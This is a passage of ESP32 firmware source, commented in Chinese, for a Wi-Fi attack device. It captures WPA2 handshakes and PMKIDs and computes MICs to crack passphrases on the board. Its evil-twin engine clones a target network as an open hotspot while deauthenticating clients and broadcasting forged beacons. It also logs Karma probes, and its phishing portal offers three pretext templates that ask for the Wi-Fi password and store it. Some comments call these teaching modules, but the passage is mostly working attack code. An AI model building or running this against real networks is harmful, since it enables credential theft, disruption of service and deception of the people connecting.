      strlcat(st.probes, ssid, sizeof(st.probes));
    }
    return;
  }
  if (sAirodump.stationCount >= 8) return;
  AirodumpStation &st = sAirodump.stations[sAirodump.stationCount++];
  strlcpy(st.mac, mac, sizeof(st.mac));
  strlcpy(st.bssid, bs, sizeof(st.bssid));
  st.rssi = rssi;
  st.packets = 1;
  st.probes[0] = 0;
  if (ssid && ssid[0]) strlcpy(st.probes, ssid, sizeof(st.probes));
}

// Karma: 记录真实 Probe Request (5s 内同 MAC+SSID 去重)
static void karmaObserveProbe(const uint8_t *f, int len, int8_t rssi) {
  if (len < 26) return;
  char ssid[33];
  if (ieFindSsid(f, len, 24, ssid, sizeof(ssid)) <= 0) return;   // 忽略隐藏/通配探针
  char mac[18];
  macToStr(mac, f + 10);
  const uint32_t now = millis();
  for (int i = 0; i < sKarma.probeCount; i++) {
    int idx = (sKarma.probeHead + 10 - sKarma.probeCount + i) % 10;
    if (strcmp(sKarma.probes[idx].mac, mac) == 0 && strcmp(sKarma.probes[idx].ssid, ssid) == 0) {
      if (now - sKarma.probes[idx].ts < 5000) return;
      break;
    }
  }
  bool baited = false;
  if (sEvilTwin.active) {
    if (sEvilTwin.cloneSsid.length() && strcmp(ssid, sEvilTwin.cloneSsid.c_str()) == 0) baited = true;
    else if (apSsid.length() && strcmp(ssid, apSsid.c_str()) == 0) baited = true;
  }
  addKarmaProbe(mac, ssid, rssi, baited);
}

// 握手包解析 (只处理数据帧中的 EAPOL-Key)
static void handleEapolFrame(const uint8_t *f, int len) {
  if (len < 40) return;
  if ((f[0] & 0x0C) != 0x08) return;             // 只要数据帧
  const int off = eapolOffset(f, len);
  if (off < 0) return;
  const uint8_t *e = f + off;
  // sig_len 是否含 4 字节 FCS 因驱动/芯片而异; 只按 EAPOL 自身长度字段判断, 避免误丢帧
  const int avail = len - off;
  if (avail < 99) return;
  if (e[1] != 0x03) return;                      // EAPOL-Key (802.1X type 3)
  const uint16_t bodyLen = ((uint16_t)e[2] << 8) | (uint16_t)e[3];
  if (bodyLen < 95 || (int)bodyLen + 4 > avail) return;

  const uint16_t keyInfo = ((uint16_t)e[5] << 8) | (uint16_t)e[6];
  if (!(keyInfo & 0x0008)) return;               // 只处理 pairwise (四次握手)
  const bool ack = (keyInfo & 0x0080) != 0;
  const bool hasMic = (keyInfo & 0x0100) != 0;
  const bool secure = (keyInfo & 0x0200) != 0;
  const uint8_t ver = (uint8_t)(keyInfo & 0x0007);

  const bool fromDs = (f[0] & 0x02) != 0;
  const uint8_t *ap  = fromDs ? f + 10 : f + 4;   // BSSID
  const uint8_t *sta = fromDs ? f + 4 : f + 10;   // 对端 STA
  if (sHandshake.hasTarget && memcmp(ap, sHandshake.targetBssid, 6) != 0) return;

  sHandshake.frameCount++;

  if (ack && !hasMic) {                           // M1: AP → STA, 携带 ANonce
    memcpy(sHandshake.anonce, e + 17, 32);
    memcpy(sHandshake.bssid, ap, 6);
    memcpy(sHandshake.stmac, sta, 6);
    sHandshake.keyver = ver;
    sHandshake.m1 = true;
    // PMKID KDE: 0xdd, len, 00:0f:ac:04, 16 字节 PMKID
    const uint16_t kdLen = ((uint16_t)e[97] << 8) | (uint16_t)e[98];
    for (int i = 0; i + 22 <= (int)kdLen && 99 + i + 22 <= (int)bodyLen + 4; i++) {
      const uint8_t *kd = e + 99 + i;
      if (kd[0] == 0xDD && kd[1] >= 20 && kd[2] == 0x00 && kd[3] == 0x0F &&
          kd[4] == 0xAC && kd[5] == 0x04) {
        sHandshake.pmkid = true;
        break;
      }
    }
  } else if (hasMic && !ack && !secure) {         // M2: STA → AP, SNonce + MIC
    uint16_t flen = (uint16_t)(bodyLen + 4);
    if (flen > sizeof(sHandshake.eapol)) flen = sizeof(sHandshake.eapol);
    memcpy(sHandshake.eapol, e, flen);
    sHandshake.eapolLen = flen;
    memcpy(sHandshake.snonce, e + 17, 32);
    memcpy(sHandshake.bssid, ap, 6);
    memcpy(sHandshake.stmac, sta, 6);
    sHandshake.keyver = ver;
    sHandshake.m2 = true;
  } else if (hasMic && ack) {                     // M3: AP → STA, GTK
    sHandshake.m3 = true;
  } else if (hasMic && secure) {                  // M4: STA → AP, ACK
    sHandshake.m4 = true;
  }

  if (sHandshake.m1 && sHandshake.m2) sHandshake.captured = true;
  // keyver 0 = AKM 自定义 (WPA3-SAE), 3 = 802.11w PMF; 两者的 MIC 算法板载未实现
  if (sHandshake.keyver == 0 || sHandshake.keyver >= 3) sHandshake.unsupported = true;
}

// 统一 promiscuous 回调: 按当前运行模块把同一帧分发给握手/嗅探/侦察/Karma 观察器
static void onPromiscuousFrame(void *buf, wifi_promiscuous_pkt_type_t type) {
  const wifi_promiscuous_pkt_t *pkt = (const wifi_promiscuous_pkt_t *)buf;
  const uint8_t *f = pkt->payload;
  const int len = (int)pkt->rx_ctrl.sig_len;
  if (len < 10) return;
  const int8_t rssi = pkt->rx_ctrl.rssi;
  const uint8_t ch = pkt->rx_ctrl.channel ? pkt->rx_ctrl.channel : apChannelActive;

  if (sHandshake.capturing) handleEapolFrame(f, len);
  if (sSniffer.running) snifferObserve(f, len, rssi, ch);

  const uint8_t ftype = (f[0] >> 2) & 0x03;
  const uint8_t sub = (f[0] >> 4) & 0x0F;
  if (sKarma.running && ftype == 0 && sub == 4) karmaObserveProbe(f, len, rssi);
  if (sAirodump.running && len >= 24) {
    char ssid[33] = {0};
    if (ftype == 0 && (sub == 4 || sub == 5 || sub == 8)) {
      ieFindSsid(f, len, (sub == 4) ? 24 : 36, ssid, sizeof(ssid));
    }
    airodumpObserve(f + 10, f + 4, f + 16, rssi, ssid);
  }
}

static bool promiscuousWanted() {
  return sHandshake.capturing || sSniffer.running || sAirodump.running || sKarma.running;
}

// 按活跃模块统一配置过滤掩码与回调; 没有模块需要时关闭 promiscuous。
// 返回 promiscuous 是否处于开启状态 (无模块需要时视为成功)。
static bool syncPromiscuousEngine() {
  if (!promiscuousWanted()) {
    esp_wifi_set_promiscuous(false);
    return true;
  }
  uint32_t mask = 0;
  if (sSniffer.running) {
    mask |= WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_CTRL | WIFI_PROMIS_FILTER_MASK_DATA;
  }
  if (sAirodump.running || sKarma.running) {
    mask |= WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA;
  }
  if (sHandshake.capturing) mask |= WIFI_PROMIS_FILTER_MASK_DATA;

  wifi_promiscuous_filter_t filter = {};
  filter.filter_mask = mask;
  esp_wifi_set_promiscuous_filter(&filter);
  esp_wifi_set_promiscuous_rx_cb(onPromiscuousFrame);
  return esp_wifi_set_promiscuous(true) == ESP_OK;
}

/* ---- 板载跑包所需的密码学原语 (mbedtls, ESP32 有 SHA 硬件加速) ---- */
static void pbkdf2Sha1(const uint8_t *pass, size_t passLen,
                       const uint8_t *salt, size_t saltLen, uint8_t out[32]) {
  memset(out, 0, 32);
  const mbedtls_md_info_t *md = mbedtls_md_info_from_type(MBEDTLS_MD_SHA1);
  if (!md) return;
  mbedtls_md_context_t ctx;
  mbedtls_md_init(&ctx);
  if (mbedtls_md_setup(&ctx, md, 1) != 0) { mbedtls_md_free(&ctx); return; }

  uint8_t saltBlock[40];   // ESSID ≤ 32 字节 + 4 字节块序号
  if (saltLen > 32) saltLen = 32;
  memcpy(saltBlock, salt, saltLen);
  for (uint32_t block = 1; block <= 2; block++) {
    uint8_t u[20], t[20];
    saltBlock[saltLen + 0] = (uint8_t)(block >> 24);
    saltBlock[saltLen + 1] = (uint8_t)(block >> 16);
    saltBlock[saltLen + 2] = (uint8_t)(block >> 8);
    saltBlock[saltLen + 3] = (uint8_t)block;

    mbedtls_md_hmac_starts(&ctx, pass, passLen);
    mbedtls_md_hmac_update(&ctx, saltBlock, saltLen + 4);
    mbedtls_md_hmac_finish(&ctx, u);
    memcpy(t, u, 20);
    for (int i = 1; i < 4096; i++) {
      mbedtls_md_hmac_reset(&ctx);
      mbedtls_md_hmac_update(&ctx, u, 20);
      mbedtls_md_hmac_finish(&ctx, u);
      for (int j = 0; j < 20; j++) t[j] ^= u[j];
    }
    const size_t take = (block == 1) ? 20 : 12;   // 只要 32 字节
    memcpy(out + (block - 1) * 20, t, take);
  }
  mbedtls_md_free(&ctx);
}

// PTK = PRF-512(PMK, "Pairwise key expansion", KDD): 每块独立 HMAC, 不链式
static void prfSha1(const uint8_t pmk[32], uint8_t ptk[80]) {
  memset(ptk, 0, 80);
  static const uint8_t LABEL[22] = {'P','a','i','r','w','i','s','e',' ','k','e','y',' ',
                                    'e','x','p','a','n','s','i','o','n'};
  uint8_t kdd[76];
  const uint8_t *aa = sHandshake.bssid, *spa = sHandshake.stmac;
  const uint8_t *an = sHandshake.anonce, *sn = sHandshake.snonce;
  if (memcmp(aa, spa, 6) <= 0) { memcpy(kdd, aa, 6); memcpy(kdd + 6, spa, 6); }
  else { memcpy(kdd, spa, 6); memcpy(kdd + 6, aa, 6); }
  if (memcmp(an, sn, 32) <= 0) { memcpy(kdd + 12, an, 32); memcpy(kdd + 44, sn, 32); }
  else { memcpy(kdd + 12, sn, 32); memcpy(kdd + 44, an, 32); }

  uint8_t msg[100];
  memcpy(msg, LABEL, 22);
  msg[22] = 0x00;                 // hostapd 的 label 以 NUL 结尾
  memcpy(msg + 23, kdd, 76);
  const mbedtls_md_info_t *md = mbedtls_md_info_from_type(MBEDTLS_MD_SHA1);
  if (!md) return;
  for (int i = 0; i < 4; i++) {
    msg[99] = (uint8_t)i;
    mbedtls_md_hmac(md, pmk, 32, msg, 100, ptk + i * 20);
  }
}

// 用候选口令重算 M2 的 MIC; 成功返回 true
static bool computeM2Mic(const char *pass, uint8_t mic[16]) {
  const mbedtls_md_type_t alg = (sHandshake.keyver == 1) ? MBEDTLS_MD_MD5 : MBEDTLS_MD_SHA1;
  const mbedtls_md_info_t *md = mbedtls_md_info_from_type(alg);
  if (!md) return false;
  uint8_t pmk[32];
  pbkdf2Sha1((const uint8_t *)pass, strlen(pass),
             (const uint8_t *)sHandshake.essid.c_str(), sHandshake.essid.length(), pmk);
  uint8_t ptk[80];
  prfSha1(pmk, ptk);
  uint8_t frame[256];
  memcpy(frame, sHandshake.eapol, sHandshake.eapolLen);
  memset(frame + 81, 0, 16);      // MIC 字段置零后才是被 HMAC 的内容
  mbedtls_md_hmac(md, ptk, 16, frame, sHandshake.eapolLen, mic);
  return true;
}

// 关闭监听并恢复 AP 信道 (停止/跑包前调用)
static void stopCaptureEngine() {
  sHandshake.capturing = false;
  if (sHandshake.channelMoved) {
    applyApChannel(sHandshake.restoreChannel);
    sHandshake.channelMoved = false;
  }
  syncPromiscuousEngine();   // 若 Sniffer/Airodump/Karma 仍在运行, 保持 promiscuous 开启
}

/* ---------------- chip / 工具 ---------------- */
static String detectChipKey() {
  String chip = ESP.getChipModel();
  chip.trim();
  return chip;
}

static String formatMac(const uint8_t *m) {
  char buf[18];
  sprintf(buf, "%02X:%02X:%02X:%02X:%02X:%02X", m[0], m[1], m[2], m[3], m[4], m[5]);
  return String(buf);
}

/* ---------------- 邪恶双子攻击引擎 (真实改名 + 联动 Deauth + 双子跳频) ---------------- */
static const uint32_t TWIN_HOP_INTERVAL_MS = 2000;  // 每 2s 向双子信道跳频一次
static const uint8_t  TWIN_HOP_FRAMES      = 3;     // 每个跳频窗口连发 3 帧后返回主信道
static const uint8_t  TWIN_HOP_TX_GAP_MS   = 80;    // 跳频窗口内帧间隔

// 启动真实攻击: 失败返回 false 并在 err 给出中文原因
static bool eviltwinStartAttack(String &err) {
  if (!sTarget.set || sTarget.channel < 1 || sTarget.channel > 14) {
    err = "主目标必须是 2.4G 频段 (信道 1-14): 克隆热点只能工作在 2.4G, 请先把 2.4G 信号设为主目标";
    return false;
  }
  if (sEvilTwin.cloneSsid.length() == 0) sEvilTwin.cloneSsid = sTarget.ssid;
  if (sEvilTwin.cloneSsid.length() == 0) { err = "无可用克隆 SSID: 请先设置主目标"; return false; }

  sEvilTwin.restoreSsid    = apSsid;
  sEvilTwin.restoreChannel = apChannel;

  // 1) 热点真实改名: 与目标一模一样的 SSID + 开放无密码 (victim 无需密码即可接入钓鱼页) + 主目标信道
  if (!WiFi.softAP(sEvilTwin.cloneSsid.c_str(), nullptr, sTarget.channel, false, 4)) {
    err = "克隆热点启动失败 (SSID 改名 + 开放认证)";
    return false;
  }
  apChannelActive = (uint8_t)sTarget.channel;
  sEvilTwin.apCloned = true;

  // 2) 自动启动对主目标的持续 Deauth (本机已在目标信道, channelMoved 保持 false)
  sDeauth.targetBssid   = sTarget.bssid;
  sDeauth.targetChannel = (uint8_t)sTarget.channel;
  buildDeauthFrame(sDeauth);
  sDeauth.channelMoved   = false;
  sDeauth.restoreChannel = apChannel;
  sDeauth.txOk = false; sDeauth.lastTxErr = 0;
  sDeauth.running = sDeauth.frameReady;   // BSSID 非法时仍保留克隆热点, 但不注入
  sDeauth.frameCount = 0; sDeauth.lastTxTime = millis(); sDeauth.lastLogTime = millis();
  sEvilTwin.deauthAuto = sDeauth.running;

  // 3) 双子目标列表: 至少一条可用则启用轮询跳频注入 (含「假 AP」信标广播)
  sEvilTwin.hopEnabled = false; sEvilTwin.hopping = false; sEvilTwin.hopCurrent = -1;
  sEvilTwin.hopNext = 0;
  sEvilTwin.twinFrameCount = 0; sEvilTwin.beaconCount = 0; sEvilTwin.hopCount = 0;
  sEvilTwin.lastHopAt = millis();
  int usable = 0;
  for (int i = 0; i < MAX_TWINS; i++) {
    if (sTwins[i].used && sTwins[i].channel >= 1) usable++;
  }
  sEvilTwin.hopEnabled = (usable > 0);
  sEvilTwin.caught = false;
  return true;
}

// 选取下一条双子目标并切到它的信道, 预构本窗口要发的帧。成功返回 true。
static bool eviltwinBeginHop() {
  for (int tries = 0; tries < MAX_TWINS; tries++) {
    int idx = (sEvilTwin.hopNext + tries) % MAX_TWINS;
    TwinTarget &t = sTwins[idx];
    if (!t.used || t.channel < 1) continue;
    if (!applyApChannel((uint8_t)t.channel)) continue;
    sEvilTwin.hopCurrent = (int8_t)idx;
    sEvilTwin.hopNext = (uint8_t)((idx + 1) % MAX_TWINS);
    // Deauth 帧: BSSID 合法才发 (假 AP 条目也可同时踢掉其真实客户端)
    sEvilTwin.twinFrameReady = buildDeauthFrameRaw(t.bssid, 1, sEvilTwin.twinFrame);
    // 假 AP: 构伪造信标
    sEvilTwin.beaconLen = 0;
    if (t.fakeAp) {
      String bssid = t.bssid;
      uint8_t probe[6];
      if (bssid.length() == 0 || !parseBssid(bssid, probe)) {
        // BSSID 缺失/非法时按 SSID 派生一个本地伪造 MAC (locally administered 位已置)
        uint8_t mac[6] = {0x02, 0x00, 0x00, 0x00, 0x00, 0x00};
        for (size_t k = 0; k < t.ssid.length(); k++) mac[2 + (k % 4)] ^= (uint8_t)t.ssid[k];
        mac[5] ^= (uint8_t)t.channel;
        char buf[18];
        snprintf(buf, sizeof(buf), "%02X:%02X:%02X:%02X:%02X:%02X",
                 mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
        bssid = String(buf);
      }
      sEvilTwin.beaconLen = buildBeaconFrame(t.ssid.length() ? t.ssid : sEvilTwin.cloneSsid,
                                            bssid, (uint8_t)t.channel, sEvilTwin.beaconFrame);
    }
    sEvilTwin.twinFramesLeft = TWIN_HOP_FRAMES;
    sEvilTwin.beaconLeft = (sEvilTwin.beaconLen > 0) ? 2 : 0;
    sEvilTwin.hopping = true;
    sEvilTwin.hopCount++;
    return true;
  }
  return false;
}

// 攻击收尾: restoreAp=true 时同时恢复原热点名/密码/信道 (手动停止);
// false 时仅停止空口干扰 (捕获凭据后, 同名开放热点保留供已接入设备浏览)。
static void eviltwinStopAttack(bool restoreAp) {
  if (sEvilTwin.hopping) {           // 正处跳频窗口: 先回主信道再收尾
    applyApChannel(sDeauth.targetChannel);
    sEvilTwin.hopping = false;
  }
  if (sEvilTwin.deauthAuto) {
    sDeauth.running = false;
    sDeauth.channelMoved = false;    // 信道归属由本攻击引擎管理
    sEvilTwin.deauthAuto = false;
  }
  sEvilTwin.hopEnabled = false;
  sEvilTwin.hopping = false;
  sEvilTwin.hopCurrent = -1;
  sEvilTwin.twinFramesLeft = 0;
  sEvilTwin.beaconLeft = 0;
  if (restoreAp && sEvilTwin.apCloned) {
    WiFi.softAP(sEvilTwin.restoreSsid.c_str(), AP_PASSWORD, sEvilTwin.restoreChannel, false, 4);
    apChannelActive = sEvilTwin.restoreChannel;
    sEvilTwin.apCloned = false;
  }
}

/* ---------------- HTTP 处理 ---------------- */
static void sendAdminPage() {
  server.sendHeader("Content-Encoding", "deflate");
  server.send_P(200, "text/html; charset=utf-8", (const char *)ADMIN_PAGE, ADMIN_PAGE_LEN);
}

static void sendPortalPage() {
  String targetName = sEvilTwin.cloneSsid.length() ? sEvilTwin.cloneSsid : (sTarget.ssid.length() ? sTarget.ssid : apSsid);

  // 攻击准备 (页面模板): 1=固件升级 2=认证过期 3=网络拥堵重连
  String tplBadge, tplTitle, tplWarn, tplFoot;
  switch (sEvilTwin.templateId) {
    case 2:
      tplBadge = "⚠️ 网络认证已过期";
      tplTitle = "重新认证以恢复上网";
      tplWarn  = "路由器 <b>" + htmlEscape(targetName) + "</b> 的拨号认证信息已失效，当前设备被限制访问互联网。请输入该 Wi-Fi 的连接密码以自动重新认证。";
      tplFoot  = "Router Authentication Portal · 802.11ax";
      break;
    case 3:
      tplBadge = "⚠️ 网络拥堵 · 需重连";
      tplTitle = "重新连接无线网络";
      tplWarn  = "检测到 <b>" + htmlEscape(targetName) + "</b> 信道拥堵，路由器已重置当前会话。为恢复稳定连接，请重新输入该 Wi-Fi 的连接密码。";
      tplFoot  = "Router Traffic Control · 802.11ax";
      break;
    default:
      tplBadge = "⚠️ 路由器系统安全维护";
      tplTitle = "网络连接验证与恢复";
      tplWarn  = "检测到无线路由器 <b>" + htmlEscape(targetName) + "</b> 正在进行无线射频固件更新。为恢复上网，需验证无线凭据以同步配置。";
      tplFoot  = "Router Security Maintenance Portal · 802.11ax";
      break;
  }

  String html = "<!DOCTYPE html><html><head><meta charset='utf-8'>"
    "<meta name='viewport' content='width=device-width,initial-scale=1'>"
    "<title>" + tplTitle + "</title>"
    "<style>"
    "body{margin:0;padding:24px 16px;background:#f5f0e8;font-family:-apple-system,BlinkMacSystemFont,sans-serif;color:#111}"
    ".card{max-width:440px;margin:20px auto;background:#fff;border:3px solid #111;border-radius:16px;box-shadow:6px 6px 0 #111;padding:24px}"
    ".badge{background:#ffe14d;border:2px solid #111;border-radius:8px;padding:4px 8px;font-weight:900;font-size:12px;display:inline-block;margin-bottom:12px}"
    "h2{margin:0 0 10px;font-size:20px;font-weight:900}"
    "p{font-size:14px;color:#444;line-height:1.6;margin:0 0 16px}"
    ".warn-box{background:#ffefd5;border-left:5px solid #ffa14d;padding:10px;border-radius:6px;font-size:13px;margin-bottom:16px}"
    "input[type=password]{width:100%;box-sizing:border-box;padding:12px 14px;border:3px solid #111;border-radius:10px;font-size:16px;font-weight:700;outline:none;background:#fafafa;margin-bottom:16px}"
    "input[type=password]:focus{background:#fff;border-color:#ff8fab}"
    "button{width:100%;padding:14px;background:#ffdf5d;color:#111;font-weight:900;font-size:16px;border:3px solid #111;border-radius:12px;cursor:pointer;box-shadow:4px 4px 0 #111}"
    "button:active{transform:translate(2px,2px);box-shadow:2px 2px 0 #111}"
    ".foot{text-align:center;font-size:11px;color:#888;margin-top:20px}"
    "</style></head><body>"
    "<div class='card'>"
    "<div class='badge'>" + tplBadge + "</div>"
    "<h2>" + tplTitle + "</h2>"
    "<div class='warn-box'>" + tplWarn + "</div>"
    "<p>请输入该 Wi-Fi 网络当前使用的连接密码：</p>"
    "<form method='POST' action='/api/portal/submit'>"
    "<input type='password' name='wifi_password' placeholder='请输入 Wi-Fi 密码' required minlength='8' autocomplete='off'>"
    "<button type='submit'>✓ 验证并恢复网络连接</button>"
    "</form>"
    "<div class='foot'>" + tplFoot + "</div>"
    "</div></body></html>";
  server.send(200, "text/html; charset=utf-8", html);
}

static void handlePortalSubmit() {
  String pass = server.arg("wifi_password");
  pass.trim();
  String clientIp = server.client().remoteIP().toString();
  if (pass.length() > 0) {
    addCredential(clientIp, pass);
    // 双子攻击中捕获到第一条凭据: 自动收尾 — 停止 Deauth/跳频, 同名开放热点保留供其浏览
    if (sEvilTwin.active && !sEvilTwin.caught) {
      sEvilTwin.caught = true;
      eviltwinStopAttack(false);
      log("[eviltwin] 已捕获凭据, 自动停止 Deauth 攻击; 克隆热点保持开放, 后台点「停止实验」恢复原热点");
      emitJson("eviltwin", "\"caught\":true,\"client\":\"" + jsonEscape(clientIp) + "\"");
    }
  }
  String resp = "<!DOCTYPE html><html><head><meta charset='utf-8'>"
    "<meta name='viewport' content='width=device-width,initial-scale=1'>"
    "<title>正在恢复连接</title>"
    "<style>body{margin:0;padding:30px;background:#f5f0e8;text-align:center;font-family:sans-serif}"
    ".card{max-width:400px;margin:40px auto;background:#fff;border:3px solid #111;border-radius:16px;padding:24px;box-shadow:6px 6px 0 #111}"
    "</style></head><body><div class='card'>"
    "<h2 style='color:#35c04a'>✓ 凭据已同步</h2>"
    "<p>配置验证通过，路由器正在重新载入射频驱动，将在 30 秒内恢复互联网访问，请稍候并保持连接。</p>"
    "</div></body></html>";
  server.send(200, "text/html; charset=utf-8", resp);
}

static String targetJson(const Target &t) {
  if (!t.set) return "null";
  String j = "{";
  j += "\"ssid\":\"" + jsonEscape(t.ssid) + "\",";
  j += "\"bssid\":\"" + jsonEscape(t.bssid) + "\",";
  j += "\"channel\":" + String(t.channel) + ",";
  j += "\"rssi\":" + String(t.rssi) + ",";
  j += "\"auth\":\"" + jsonEscape(t.auth) + "\"}";
  return j;
}

static void sendInfo() {
  uint32_t freeHeap = ESP.getFreeHeap();
  uint32_t minFree  = ESP.getMinFreeHeap();
  uint32_t maxBlock = ESP.getMaxAllocHeap();
  uint32_t total    = ESP.getHeapSize();
  uint8_t  usedPct  = total ? (uint8_t)((total - freeHeap) * 100 / total) : 0;

  String json;
  json.reserve(640);
  json = "{";
  json += "\"chip\":\"" + jsonEscape(detectChipKey()) + "\",";
#if SOC_WIFI_SUPPORT_5G
  json += "\"band5g\":true,";
#else
  json += "\"band5g\":false,";
#endif
  json += "\"version\":\"" FW_VERSION "\",";
  uint8_t macAddressBytes[6];
  WiFi.softAPmacAddress(macAddressBytes);
  json += "\"mac\":\"" + formatMac(macAddressBytes) + "\",";
  json += "\"uptime\":" + String(millis() / 1000) + ",";
  json += "\"freeMem\":" + String(freeHeap) + ",";
  json += "\"minFreeMem\":" + String(minFree) + ",";
  json += "\"maxBlock\":" + String(maxBlock) + ",";
  json += "\"memUsedPct\":" + String(usedPct) + ",";
  // 攻击期间热点已真实改名: ssid 报告空口实际 SSID, configSsid 报告 NVS 配置名
  json += "\"ssid\":\"" + jsonEscape(sEvilTwin.apCloned ? sEvilTwin.cloneSsid : apSsid) + "\",";
  json += "\"configSsid\":\"" + jsonEscape(apSsid) + "\",";
  json += "\"channel\":" + String(apChannelActive) + ",";  // 空口实际信道 (攻击期间可能与配置值不同)
  json += "\"clients\":" + String(WiFi.softAPgetStationNum()) + ",";
  
  // 教学模块状态
  json += "\"evilTwin\":{\"active\":" + String(sEvilTwin.active ? "true" : "false") +
          ",\"cloneSsid\":\"" + jsonEscape(sEvilTwin.cloneSsid) +
          "\",\"apCloned\":" + String(sEvilTwin.apCloned ? "true" : "false") +
          ",\"hopEnabled\":" + String(sEvilTwin.hopEnabled ? "true" : "false") +
          ",\"hopping\":" + String(sEvilTwin.hopping ? "true" : "false") +
          ",\"hopCount\":" + String(sEvilTwin.hopCount) +
          ",\"twinFrames\":" + String(sEvilTwin.twinFrameCount) +
          ",\"beacons\":" + String(sEvilTwin.beaconCount) +
          ",\"twins\":" + String(twinCount()) +
          ",\"hopCurrent\":" + String((int)sEvilTwin.hopCurrent) +
          ",\"template\":" + String(sEvilTwin.templateId) +
          ",\"elapsedMs\":" + String(sEvilTwin.active ? (millis() - sEvilTwin.startTime) : 0) +
          ",\"caught\":" + String(sEvilTwin.caught ? "true" : "false") +
          ",\"credsCount\":" + String(sCredCount) + "},";
  json += "\"deauth\":{\"running\":" + String(sDeauth.running ? "true" : "false") +
          ",\"count\":" + String(sDeauth.frameCount) +
          ",\"rate\":" + String(sDeauth.rateLimitMs ? (1000 / sDeauth.rateLimitMs) : 10) +
          ",\"channel\":" + String(sDeauth.targetChannel) + "},";
  json += "\"handshake\":{\"capturing\":" + String(sHandshake.capturing ? "true" : "false") +
          ",\"captured\":" + String(sHandshake.captured ? "true" : "false") +
          ",\"keyver\":" + String(sHandshake.keyver) +
          ",\"frames\":" + String(sHandshake.frameCount) +
          ",\"m4\":" + String(sHandshake.m4 ? "true" : "false") +
          ",\"pmkid\":" + String(sHandshake.pmkid ? "true" : "false") +
          ",\"crackedPass\":\"" + jsonEscape(sHandshake.crackedPass) + "\"},";
  json += "\"sniffer\":{\"running\":" + String(sSniffer.running ? "true" : "false") +
          ",\"fps\":" + String(sSniffer.fps) +
          ",\"total\":" + String(sSniffer.totalPackets) + "},";
  json += "\"airodump\":{\"running\":" + String(sAirodump.running ? "true" : "false") +
          ",\"channel\":" + String(sAirodump.currentChannel) +
          ",\"band\":" + String(isBand5G(sAirodump.currentChannel) ? 5 : 2) +
          ",\"stations\":" + String(sAirodump.stationCount) + "},";
  json += "\"karma\":{\"running\":" + String(sKarma.running ? "true" : "false") +
          ",\"probes\":" + String(sKarma.probesCaptured) +
          ",\"baited\":" + String(sKarma.probesBaited) + "},";

  json += "\"target\":" + targetJson(sTarget) + ",";
  // 双子目标列表 (最多 4 条, 含假 AP 标记与当前跳频指向)
  json += "\"twins\":[";
  bool firstTwin = true;
  for (int i = 0; i < MAX_TWINS; i++) {
    if (!sTwins[i].used) continue;
    if (!firstTwin) json += ",";
    firstTwin = false;
    json += "{\"idx\":" + String(i) +
            ",\"ssid\":\"" + jsonEscape(sTwins[i].ssid) +
            "\",\"bssid\":\"" + jsonEscape(sTwins[i].bssid) +
            "\",\"channel\":" + String(sTwins[i].channel) +
            ",\"auth\":\"" + jsonEscape(sTwins[i].auth) +
            "\",\"rssi\":" + String(sTwins[i].rssi) +
            ",\"fakeAp\":" + String(sTwins[i].fakeAp ? "true" : "false") +
            ",\"active\":" + String((sEvilTwin.hopCurrent == (int8_t)i) ? "true" : "false") + "}";
  }
  json += "],";
  // 仍在使用出厂初始口令时提示面板引导用户立即改密 (口令本身绝不下发)
  json += "\"mustChangeToken\":" + String(sMustChangeToken ? "true" : "false");
  json += "}";
  server.sendHeader("Access-Control-Allow-Origin", "*");
  server.send(200, "application/json", json);
}

static void handleScan() {
  log("[scan] 开始扫描周围 AP …");
  // 优化: 主动扫描信道驻留时间设为 120ms (扫描耗时缩减 60%, 显著降低软 AP 连接抖动与看门狗超时风险)
  int16_t n = WiFi.scanNetworks(false, true, false, 120);
  if (n < 0) {
    WiFi.scanDelete();
    n = WiFi.scanNetworks(false, true, false, 150);
  }
  String json;
  json.reserve(1024 + (n > 0 ? n * 120 : 0));
  json = "{\"networks\":[";
  int count = 0;
  for (int i = 0; i < n; i++) {
    if (count) json += ",";
    String ssid = WiFi.SSID(i);
    bool hidden = (ssid.length() == 0);
    json += "{\"ssid\":\"" + jsonEscape(hidden ? "" : ssid) + "\",";
    json += "\"hidden\":" + String(hidden ? "true" : "false") + ",";
    json += "\"rssi\":" + String(WiFi.RSSI(i)) + ",";
    json += "\"channel\":" + String(WiFi.channel(i)) + ",";
    json += "\"bssid\":\"" + WiFi.BSSIDstr(i) + "\",";
    String auth;
    switch (WiFi.encryptionType(i)) {
      case WIFI_AUTH_OPEN:  auth = "Open"; break;
      case WIFI_AUTH_WEP:   auth = "WEP"; break;
      case WIFI_AUTH_WPA_PSK:   auth = "WPA"; break;
      case WIFI_AUTH_WPA2_PSK:  auth = "WPA2"; break;
      case WIFI_AUTH_WPA_WPA2_PSK: auth = "WPA/WPA2"; break;
      case WIFI_AUTH_WPA2_ENTERPRISE: auth = "WPA2-Ent"; break;
      case WIFI_AUTH_WPA3_PSK: auth = "WPA3"; break;
      case WIFI_AUTH_WPA2_WPA3_PSK: auth = "WPA2/WPA3"; break;
      default: auth = "Unknown"; break;
    }
    json += "\"auth\":\"" + auth + "\"}";
    // 每个 AP 镜像一条结构化遥测 (只读: SSID/RSSI/信道/BSSID/加密方式)
    emitJson("scan_result",
             "\"ssid\":\"" + jsonEscape(hidden ? "" : ssid) +
             "\",\"rssi\":" + String(WiFi.RSSI(i)) +
             ",\"ch\":" + String(WiFi.channel(i)) +
             ",\"bssid\":\"" + WiFi.BSSIDstr(i) +
             "\",\"auth\":\"" + auth + "\"");
    count++;
  }
  json += "]}";
  WiFi.scanDelete();
  log("[scan] 扫描完成, " + String(count) + " 个 AP");
  server.sendHeader("Access-Control-Allow-Origin", "*");
  server.send(200, "application/json", json);
}

static void handleTarget() {
  if (!server.hasArg("plain")) {
    server.send(400, "application/json", "{\"error\":\"missing body\"}");
    return;
  }
  String body = server.arg("plain");

  Target t;
  t.set     = true;
  t.ssid    = extractJson(body, "ssid");
  t.bssid   = extractJson(body, "bssid");
  t.auth    = extractJson(body, "auth");
  t.channel = extractJson(body, "channel").toInt();
  t.rssi    = extractJson(body, "rssi").toInt();
  t.ssid.trim();
  t.bssid.trim();
  t.auth.trim();

  // 主目标约束: 克隆热点只能工作在 2.4G
  if (t.channel < 1 || t.channel > 14) {
    server.send(400, "application/json",
                "{\"ok\":false,\"error\":\"主目标必须是 2.4G 频段 (信道 1-14); 5G 信号请加入「双子目标」列表\"}");
    return;
  }

  sTarget = t;
  // 克隆名与主目标保持一模一样 (页面上可显式覆盖)
